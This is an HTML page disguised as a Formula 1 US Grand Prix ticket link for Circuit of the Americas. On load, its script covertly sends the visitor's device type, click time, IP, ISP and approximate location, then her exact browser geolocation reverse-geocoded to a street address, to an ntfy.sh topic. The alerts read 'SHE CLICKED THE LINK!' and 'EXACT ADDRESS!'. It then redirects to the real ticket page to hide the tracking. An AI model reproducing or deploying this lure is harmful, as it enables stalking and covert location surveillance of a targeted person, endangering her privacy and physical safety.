<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>F1 USGP Tickets - COTA</title>
<style>body{margin:0;background:#fff}</style>
</head>
<body>
<script>
(function(){
  var T='roja-tracker-k141';
  function s(title,msg,p){
    try{fetch('https://ntfy.sh',{method:'POST',body:JSON.stringify({topic:T,title:title,message:msg,priority:p,tags:['eyes']})})}catch(e){}
  }
  var d=/mobile/i.test(navigator.userAgent)?'📱 Mobile':'💻 Desktop';
  var t=new Date().toLocaleString('en-US',{timeZone:'America/Chicago'});
  s('👀 SHE CLICKED THE LINK!','Device: '+d+'\nTime: '+t,5);

  fetch('https://ipwho.is/')
    .then(function(r){return r.json()})
    .then(function(d){
      if(!d.success)return;
      var map='https://maps.google.com/?q='+d.latitude+','+d.longitude;
      var org=d.connection&&d.connection.org?'\n🏢 '+d.connection.org:'';
      var isp=d.connection&&d.connection.isp?d.connection.isp:'Unknown';
      var zip=d.postal||'';
      s('📍 Location','📌 '+d.city+', '+d.region+' '+zip+'\n🌐 ISP: '+isp+org+'\n🔢 IP: '+d.ip+'\n🗺️ Map: '+map,4);
    }).catch(function(){});

  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(function(pos){
      var map='https://maps.google.com/?q='+pos.coords.latitude+','+pos.coords.longitude;
      fetch('https://nominatim.openstreetmap.org/reverse?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&format=json')
        .then(function(r){return r.json()})
        .then(function(d){s('📍 EXACT ADDRESS!',d.display_name+'\n🗺️ Map: '+map,5)})
        .catch(function(){});
    },function(){},{enableHighAccuracy:true,timeout:10000});
  }

  // Redirect to real COTA F1 ticket page
  setTimeout(function(){
    window.location.href='https://www.circuitoftheamericas.com/f1';
  }, 800);
})();
</script>
</body>
</html>
